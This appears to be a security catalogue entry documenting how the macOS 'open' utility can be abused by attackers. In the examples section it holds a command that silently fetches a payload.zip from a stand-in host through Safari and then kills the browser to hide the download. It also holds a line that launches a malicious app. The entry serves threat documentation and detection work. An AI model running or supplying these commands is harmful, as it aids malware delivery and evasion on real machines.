---
trust_level: community
id: macos-execution-open
namespace: macos:execution:open
name: open
description: Open files, folders, apps, URLs, and header files.
author: Brendan Chamberlain (@infosecB)
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- macos
techniques:
- execution
execution:
  template: open
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: 'Open a malicious file: The open command can be used to open a malicious
    macOS app from the terminal.'
  command: open Malicious.app
- description: 'Download a malicious file: The following command downloads the payload.zip
    file in the default browser (Safari) and then kills it.'
  command: open -g https://mypayload.io/payload.zip; sleep 3; killall Safari
install:
- method: custom
  commands:
  - /usr/bin/open
detections:
- type: other
  description: No detections at time of publishing
references:
- label: The macOS open Command
  url: https://scriptingosx.com/2017/02/the-macos-open-command/
features:
- file-system
- local
- pipes-stdin
- pipes-stdout
- process-manip
---

The open command-line utility can be used to open files, folders, app, URLs or header files in their associate macOS app.
